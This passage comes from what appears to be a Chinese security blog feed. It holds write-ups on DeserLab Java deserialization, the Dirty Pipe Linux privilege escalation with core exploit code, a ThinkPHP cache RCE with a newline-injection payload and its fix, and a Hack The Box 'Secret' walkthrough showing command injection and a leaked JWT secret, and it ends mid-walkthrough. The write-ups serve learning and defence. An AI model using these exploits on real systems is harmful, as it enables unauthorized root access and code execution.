href="#白盒分析" class="headerlink" title="白盒分析"></a>白盒分析</h2><p><img src="https://s2.loli.net/2022/03/19/mrGOwE7pn6QVdjz.png" alt="image.png"><br>图中的<code>readObject</code>便是漏洞的出现点，该方法会将输入流中的数据进行反序列化操作，然后强制转换为<code>HashRequest</code>类。<br><img src="https://s2.loli.net/2022/03/19/iBb9gU7IGjHDfKv.png" alt="image.png"><br>输入流是从socket所建立的网络连接中读取的，那么这个输入点就是我们用户可控的，也就可以在这个点测试反序列化漏洞。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html">入门介绍</a><br><a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/">DeserLab作者解释反序列化</a><br><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/">手动构造DeserLab payload</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础原理 </category>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-DirtyPipe</title>
      <link href="/2022/03/11/CVE-DirtyPipe/"/>
      <url>/2022/03/11/CVE-DirtyPipe/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>这是一个类似于<a href="https://dirtycow.ninja/">CVE-2016-5195</a> Dirty Cow的一个Linux本地提权漏洞，允许普通用户覆写任意只读文件的内容，据官方说该漏洞比Dirty Cow更容易被利用。<br>影响版本：Linux内核&gt;=5.8，在5.16.11，5.15.25和5.10.102中被修复。</p><h1 id="问题出现"><a href="#问题出现" class="headerlink" title="问题出现"></a>问题出现</h1><p>漏洞发现者收到了来自顾客的抱怨，“下载的访问日志无法解压”，经分析确认，来自一个日志服务器的日志文件损坏了。但是，它仍然能够被解压，只不过<code>gzip</code>上报了一个CRC校验错误，作者手动更改CRC后就跳过了这个错误。<br>一个月后，相同的事一次又一次的发生。每次都是文件的内容看起来没问题，只有文件最后的CRC发生了错误。有了多个损坏文件后，作者就开始分析，并发现了一个规律。</p><h1 id="问题发现"><a href="#问题发现" class="headerlink" title="问题发现"></a>问题发现</h1><p>作者在观察之后发现文件的最后32位字节变为了ZIP文件头，在这之后经过慢长的排错过程，最终将错误定位到了web服务。<br>web服务首先写ZIP头，然后使用<code>splice()</code> 来发送所有的压缩文件，最终再次使用<code>write()</code>来写“central directory file header，<code>50 4b 01 02 1e 03 14 00</code>，与所损坏的数据一致。<br>之后作者又排除了其他一些不可能的情况后，得出了Linux内核存在bug这个结论。<br>作者为了证明自己的推测，用两个C程序来模拟了一下当时的场景。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 向标准输出不断地写AAAAA内容模拟日志写功能 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">        write(<span class="number">1</span>, <span class="string">&quot;AAAAA&quot;</span>, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./wirte &gt; foo</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">splice</span><span class="params">(<span class="keyword">int</span> fd_in, <span class="keyword">off64_t</span> *off_in, <span class="keyword">int</span> fd_out,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">off64_t</span> *off_out, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 使用splice从文件向管道传输数据，然后向</span></span><br><span class="line"><span class="comment">     * 管道写入BBBBB，模拟ZIP生成器 */</span></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        splice(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        write(<span class="number">1</span>, <span class="string">&quot;BBBBB&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./splicer &lt; foo | cat &gt; /dev/null</span></span><br><span class="line"><span class="comment">// 对该文件只有读权限</span></span><br></pre></td></tr></table></figure><p><a href="https://man7.org/linux/man-pages/man2/splice.2.html">splice函数介绍</a><br>之后执行这两个程序，字符B出现在了文件中，但是程序中并没有语句来显示地实现向文件中写入字符B。<br>作者之后使用<code>git bisect</code>来进行错误查找，然后发现错误出现在了<a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958"> f6dd975583bd</a>，此次修改将管道缓存区重构为匿名管道缓冲区。</p><h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p><code>sendfile()</code>系统调用可以将文件内容直接发送到socket，而不需要再经过用户和内核空间的转换。<code>splice()</code>系统调用是<code>sendfile()</code>的标准化，如果任意一端的对象为管道，那么将提供相同的优化，另一端可以是任何对象。内核通过传递页引用来实现这一过程，不会复制任何数据（zero-copy）。<br>管道是由一系列的<a href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L26-L32">struct_pipe_buff</a>组成，每个都指向一个页面，第一个对管道的写会分配一个页面（4KB空间的大小），如果最近的一次写没有完全占据一个页面，那么之后的写会继续在该页，而不是分配一个新的页面，这也正是<a href="https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L217-L221">匿名管道</a>的工作原理。<br>如果使用<code>splice()</code>将数据从一个文件传送到管道，内核会首先将数据加载到页缓存中，然后创建一个<code>struct pipe_buffer</code>指向页缓存中的内容，与匿名管道不同的是，额外写入管道的数据不能添加到该页，因为该页是由页缓存而不是管道管理。</p><p>在Linux 5.8中，伴随着页<a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">缓存信号的修改</a>，程序员可以将<code>PIPE_BUF_FLAG_CAN_MERGE </code>标志注入到一个对页缓存的引用，这样就能够向管道写入数据，然后覆写页缓存中的内容。</p><p><strong>写入管道不需要任何的权限</strong></p><p>该漏洞存在以下四种缺陷：</p><ol><li>攻击者必须有读权限，因为需要使用<code>splice()</code>将数据写入管道</li><li>要插入数据的偏移量不能在一个页面的边界上，因为至少应该有一字节的数据写入管道</li><li>写入页缓存时不能跨越页面的边界，因为多出来的数据会存入新创建的匿名缓存中</li><li>原文件大小不能变化，管道拥有自己的页填充管理机制，不会告知有多少数据插入进了页缓存</li></ol><p>要利用这个漏洞需要做以下几件事情：</p><ol><li>创建一个管道</li><li>为管道填充任意的数据，设置<code>PIPE_BUF_FLAG_CAN_MERGE </code>标志</li><li>读取管道中所有的内容，不改变所设置的标志位</li><li>将数据从只读目标文件的特定偏移中发送到管道</li><li>将数据写入管道中，该数据会覆写缓存的页面，而不是创建一个新的匿名<code>struct pipe_buffer</code>，因为<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位设置了。</li></ol><p>执行exploit后：<br><img src="https://s2.loli.net/2022/03/11/2Ad1BFqIGyjNQbw.png" alt="image.png"></p><h1 id="作者代码分析"><a href="#作者代码分析" class="headerlink" title="作者代码分析"></a>作者代码分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建拥有PIPE_BUF_FLAG_CAN_MERGE标志的管道</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">/* p[0]读管道 p[1]写管道 */</span></span><br><span class="line"><span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 填充满管道，每个管道缓存都有PIPE_BUF_FLAG_CAN_MERGE标志 */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清空管道但留下设置的PIPE_BUF_FLAG_CAN_MERGE标志 */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向只有读权限的文件写入数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...省略代码</span></span><br><span class="line"><span class="keyword">int</span> pipe[<span class="number">2</span>];</span><br><span class="line">prepare_pipe(pipe);</span><br><span class="line"><span class="comment">// ...省略代码</span></span><br><span class="line"><span class="comment">// 从偏移量处开始读取1字节数据，会产生一个对页缓存的引用</span></span><br><span class="line"><span class="comment">// 但不会改变之前设置的PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line"><span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ...省略代码</span></span><br><span class="line"><span class="comment">// 因为PIPE_BUF_FLAG_CAN_MERGE设置了，所以会写入上面的页缓存</span></span><br><span class="line">nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line"><span class="comment">// ...省略代码</span></span><br></pre></td></tr></table></figure><h1 id="其他利用方法"><a href="#其他利用方法" class="headerlink" title="其他利用方法"></a>其他利用方法</h1><p>这个漏洞除了向文件写入内容，还有其他的利用方式，比如向二进制程序注入内容，还可以从docker或者Kubernetes这些容器中进行逃逸。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> Linux内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkphpRCE漏洞整合</title>
      <link href="/2022/03/09/ThinkphpRCE%E6%BC%8F%E6%B4%9E%E6%95%B4%E5%90%88/"/>
      <url>/2022/03/09/ThinkphpRCE%E6%BC%8F%E6%B4%9E%E6%95%B4%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h1 id="cache缓存函数设计缺陷导致的代码执行"><a href="#cache缓存函数设计缺陷导致的代码执行" class="headerlink" title="cache缓存函数设计缺陷导致的代码执行"></a>cache缓存函数设计缺陷导致的代码执行</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>为了在访问量过大时减轻服务器以及数据库查找的压力，thinkphp支持数据的缓存以此来加快访问速度。thinkphp支持多种缓存方式包括File、Redis和Memecache，其中file缓存默认是直接将数据存储到以php为后缀的文件中，这样如果服务器将用户恶意的输入存入缓存文件中，并且用户可以访问该文件，那么就可以造成任意命令执行。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>php:&gt;=5.4.0<br>thinkphp:3.2.3-5.0.10<br>创建thinkphp项目：<code>composer create-project topthink/think=5.0.10 thinkphp5.0.10</code><br>由于<code>composer</code>会自动下载当前指定的最新版本，所以还要修改项目中的<code>composer.json</code>配置文件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;php&quot;</span>: <span class="string">&quot;&gt;=5.4.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span>: <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后使用<code>composer update</code>更新一下项目。<br><strong>注意</strong>：thinkphp5不支持<code>php think run</code>，需要放在web目录下来访问。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先在<code>application/index/controller/Index.php</code>文件中写入包含漏洞的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/* input函数用来获取get请求中的huu变量值 </span></span><br><span class="line"><span class="comment">         * name为缓存标识</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (Cache::set(<span class="string">&quot;name&quot;</span>, input(<span class="string">&quot;get.huu&quot;</span>)))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;U know what u are doing!&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>?huu=%0d%0aphpinfo();//</code><br>这时我们输入payload来一步一步的分析</p><h3 id="set函数"><a href="#set函数" class="headerlink" title="set函数"></a>set函数</h3><p><img src="https://s2.loli.net/2022/03/09/wEUSOHLk3mXZn1z.png" alt="image.png"><br><img src="https://s2.loli.net/2022/03/09/8sVnyecG1NbrCLz.png" alt="image.png"><br>此时<code>value</code>的值为我们在URL中输入的内容。<br>进一步跟进类中的静态函数<code>init</code>。<br><img src="https://s2.loli.net/2022/03/09/NX6qpWtmT4Lcby1.png" alt="image.png"><br><code>init</code>是用来返回handler(句柄)的，如果handler存在则直接返回，否则调用<code>connect</code>函数来进行初始化。<br>就像我们上面所说的，thinkphp支持多种缓存方式，为了与多种缓存类型进行交互thinkphp为每个缓存引入了一个驱动，也就是handler，更具体地说每个驱动是php中一个实例化的类。详细介绍看这个<a href="https://www.cnblogs.com/dpdp/p/7492020.html">链接</a>。</p><div class="note info simple"><p>static修饰的类方法，在类实例化之前就可调用</p></div>对应的类名<p>handler不存在则会进行初始化，配置方式有以下三种</p><ul><li>用户输入<code>$options</code>数组则使用用户提供的配置</li><li>如果缓存类型(<code>cache.type</code>)为<code>complex</code>则使用默认配置</li><li>以上条件都不满足则按配置文件<code>config.php</code>来<h3 id="connect函数"><a href="#connect函数" class="headerlink" title="connect函数"></a>connect函数</h3><img src="https://s2.loli.net/2022/03/09/gyDtHxF2SW6uQfX.png" alt="image.png"><br>该函数分为以下几个过程</li></ul><ol><li>配置中如果未指定缓存类型则默认为File</li><li>是否强制重新连接，默认为false<ul><li>如果不是则将配置数组<code>options</code>序列化然后进行md5加密生成缓存连接标识</li><li>是或者<code>$instance[$name]</code>为空（注意此时<code>$name</code>的比较为强类型）<ol><li>如果存在<code>\\</code>则直接将<code>$class</code>赋值为<code>$type</code></li><li>否则加上前缀<code>\\think\\cache\\driver\\</code>然后拼接上缓存类型<code>$type</code>后赋值给<code>$class</code>（此处的类名为缓存驱动对应的类名）</li></ol><ul><li>在日志中记录下初始化信息</li><li>如果强制重新连接则直接返回生成的实例类，否则赋值给<code>$instance[$name]</code>后再返回。<h3 id="File类的set函数"><a href="#File类的set函数" class="headerlink" title="File类的set函数"></a>File类的set函数</h3><img src="https://s2.loli.net/2022/03/09/WVAnJSTKzkOuUN7.png" alt="image.png"><br>该函数的功能是将内容写入缓存，这里正是万恶之源，让我们来揪出其中的错误。<br>缓存失效时间(expire)未设置则使用默认设置。<h4 id="缓存文件名生成"><a href="#缓存文件名生成" class="headerlink" title="缓存文件名生成"></a>缓存文件名生成</h4><img src="https://s2.loli.net/2022/03/09/KUu7wjFOGME3kog.png" alt="image.png"><br>首先生成传进来的缓存变量名的md5值，并赋值给<code>$name</code></li></ul></li></ul></li></ol><ul><li>如果配置选择了缓存文件子目录选项，那么将md5值前两个字符与后面字符间由DS(Directory_Separator，目录分隔符<code>/</code>)隔开</li><li>如果配置选择了前缀选项，那么添加前缀并由目录分隔符与<code>$name</code>值隔开。</li></ul><p>文件名最后由<code>缓存文件路径+$name+.php</code>后缀组成。默认路径为<code>web目录/runtime/cache/$name.php</code><br>之后判断文件名中的路径是否存在，如果不存在则创建。<br>最后返回文件名。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>返回到File类的set函数后，将我们传入的值进行了序列化。<br><img src="https://s2.loli.net/2022/03/09/GKpYIieDUSP3b5A.png" alt="image.png"><br>可以看到换行符还保留着，最后在对<code>$data</code>进行拼接时没有进行安全转义，那么我们的代码就可以注入进去。<br><img src="https://s2.loli.net/2022/03/09/hH4uXw2MmqxG9gY.png" alt="image.png"><br>为什么有上面最开始的payload的这里展示的很清楚了，我们需要让我们的代码不被注释或者被引号包围。<br><img src="https://s2.loli.net/2022/03/09/P3Q2evrKlj4OhyW.png" alt="image.png"><br><img src="https://s2.loli.net/2022/03/09/uRtwIj6XPoFEY7v.png" alt="image.png"><br>成功的造成了命令执行。</p><h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><ol><li>打开文件：thinkphp\library\think\cache\driver\File.php</li><li>找到：<code>public function set($name, $value, $expire = null)</code></li><li>添加<code>$data = str_replace(PHP_EOL, &quot;&quot;, $data);</code>将<code>\n</code>替换掉<br><img src="https://s2.loli.net/2022/03/09/OzUk9n782DPMwQf.png" alt="image.png"><br>再次执行payload，可以看到无法再达到RCE目的。<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>此次的RCE产生的原因是开发人员写代码时，考虑的不周到，导致用户可以插入恶意的代码并最终造成RCE。<br>如果想要攻击成功需要以下几个条件：</li></ol><ul><li>知道缓存文件的名字。<del>这个缓存名字如果开发人员不修改，那么是不会改变的。</del>网上文章都这么说，个人认为<code>$name</code>的值是由开发人员决定，或者根据查询信息生成的，理论上是不固定的。详细内容看此<a href="http://document.thinkphp.cn/manual_3_2.html#data_cache">链接</a>。</li><li>服务器开启了缓存功能，并且缓存类型为File。</li><li>知道缓存文件的存放位置</li><li><code>value</code>处用户可控</li></ul><p>总的来说要实现该攻击是很困难的，在实战中可能要配合多种技术(代码泄露)才能实现。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> thinkphp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Secret</title>
      <link href="/2022/03/05/HTB-Secret/"/>
      <url>/2022/03/05/HTB-Secret/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><code>nmap -A -sV -sC -T4 10.10.11.120</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION                                                                     </span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                </span><br><span class="line">| ssh-hostkey:                                                                                     </span><br><span class="line">|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)                                     </span><br><span class="line">|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)                                    </span><br><span class="line">|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)                                  </span><br><span class="line">80/tcp   open  http    nginx 1.18.0 (Ubuntu)                                                       </span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)                                                        </span><br><span class="line">|_http-title: DUMB Docs                                                                            </span><br><span class="line">3000/tcp open  http    Node.js (Express middleware)                                                </span><br><span class="line">|_http-title: DUMB Docs                                                                            </span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  </span><br></pre></td></tr></table></figure><p>80和3000端口提供http服务，功能看起来相似。<br>网页主页有介绍，这是一个基于JWT的验证系统，用NodeJS编写而成，文档中介绍了其api地址以及所接受JSON的格式。普通和admin用户是根据<code>auth-token</code>请求头进行验证的。<br>可以在主页下载网站的源代码。</p><h1 id="普通用户权限获取"><a href="#普通用户权限获取" class="headerlink" title="普通用户权限获取"></a>普通用户权限获取</h1><p>注册一个新用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/register HTTP/1.1</span><br><span class="line">Host: 10.10.11.120:3000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 67</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;: &quot;sharps&quot;, &quot;email&quot;: &quot;sharp@mail.com&quot;, &quot;password&quot;: &quot;123456&quot;&#125;</span><br></pre></td></tr></table></figure><p>注意POST请求的内容格式要改为<code>application/json</code>。<br>在<code>/api/user/login</code>登录获取到JWT：<br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjM2YTNjNWFjNjMxYTA0NjBlNTZiZWYiLCJuYW1lIjoic2hhcnBzIiwiZW1haWwiOiJzaGFycEBtYWlsLmNvbSIsImlhdCI6MTY0Nzc0ODIzNX0.zxTXBcfMCI5GCv7x3U_qjx6bj63v41t1bXDVWIWyZRA</code><br>JWT的简单介绍可以参考<a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">这个链接</a><br>之后审计下网站代码：<br>在<mark class="hl-label blue">private.js</mark> 文件下发现了如下函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/logs&#x27;</span>, verifytoken, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> file = req.query.file; <span class="comment">// 在URL中输入file参数</span></span><br><span class="line">    <span class="keyword">const</span> userinfo = &#123; <span class="attr">name</span>: req.user &#125;</span><br><span class="line">    <span class="keyword">const</span> name = userinfo.name.name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;theadmin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> getLogs = <span class="string">`git log --oneline <span class="subst">$&#123;file&#125;</span>`</span>; <span class="comment">// 这里可以插入我们要执行的代码</span></span><br><span class="line">        exec(getLogs, <span class="function">(<span class="params">err , output</span>) =&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                res.status(<span class="number">500</span>).send(err);</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            res.json(output);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            <span class="attr">role</span>: &#123;</span><br><span class="line">                <span class="attr">role</span>: <span class="string">&quot;you are normal user&quot;</span>,</span><br><span class="line">                <span class="attr">desc</span>: userinfo.name.name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>可以看出来程序只通过name字段来判断用户是否为admin，有点讽刺意味了<em>手动滑稽</em>。<br>为了执行代码，我们首先需要获得名字为<code>theadmin</code>用户的JWT。<br>查看源代码中存在的文件，突然发现一个惊喜，<code>.env</code>文件，里面存在很有用的信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DB_CONNECT = &#x27;mongodb://127.0.0.1:27017/auth-web&#x27;</span><br><span class="line">TOKEN_SECRET = secret</span><br></pre></td></tr></table></figure><p>得到了加解密用的token，但是用这个token无法验证(verify)生成的JWT，这时又在目录里面找到了<code>.git</code>目录，看来存在git泄露。</p><h2 id="git泄露找token"><a href="#git泄露找token" class="headerlink" title="git泄露找token"></a>git泄露找token</h2><p><img src="https://s2.loli.net/2022/03/05/cwmMZsPBOhnNkbY.png" alt="发现可疑的信息"><br>使用<code>git 